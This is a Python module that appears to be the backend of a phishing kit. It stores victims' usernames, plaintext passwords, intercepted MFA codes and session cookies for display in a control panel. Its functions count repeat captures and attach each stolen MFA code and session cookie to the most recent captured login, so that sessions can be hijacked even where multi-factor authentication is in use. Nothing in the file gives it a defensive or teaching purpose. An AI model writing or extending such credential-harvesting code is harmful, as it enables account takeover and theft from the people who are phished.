from dataclasses import dataclass, field
from datetime import UTC, datetime


@dataclass
class CapturedCredential:
    username: str
    password: str
    n_captures: int = 1
    last_captured_at: datetime = field(default_factory=lambda: datetime.now(tz=UTC))
    session_cookie: str | None = None
    mfa_code: str | None = None

    def to_payload(self) -> dict[str, str | int | None]:
        """Serialize to the shape consumed by the control panel UI."""
        return {
            "username": self.username,
            "password": self.password,
            "nCaptures": self.n_captures,
            "lastCapturedAt": self.last_captured_at.isoformat(),
            "sessionCookie": self.session_cookie,
            "mfaCode": self.mfa_code,
        }


captured_credentials: list[CapturedCredential] = []


def capture_credential(username: str, password: str) -> CapturedCredential:
    for credential in captured_credentials:
        if credential.username == username and credential.password == password:
            credential.n_captures += 1
            credential.last_captured_at = datetime.now(tz=UTC)
            return credential

    credential = CapturedCredential(username=username, password=password)
    captured_credentials.append(credential)
    return credential


def capture_mfa_code(username: str, mfa_code: str) -> CapturedCredential | None:
    # The MFA form carries the username, so associate by it; fall back to the
    # most recent capture if the password step somehow slipped past us.
    for credential in reversed(captured_credentials):
        if credential.username == username:
            credential.mfa_code = mfa_code
            credential.last_captured_at = datetime.now(tz=UTC)
            return credential

    if not captured_credentials:
        return None
    credential = captured_credentials[-1]
    credential.mfa_code = mfa_code
    credential.last_captured_at = datetime.now(tz=UTC)
    return credential


def capture_session(session_cookie: str) -> CapturedCredential | None:
    if not captured_credentials:
        return None
    # Associate with the most recently captured credential
    credential = captured_credentials[-1]
    credential.session_cookie = session_cookie
    return credential

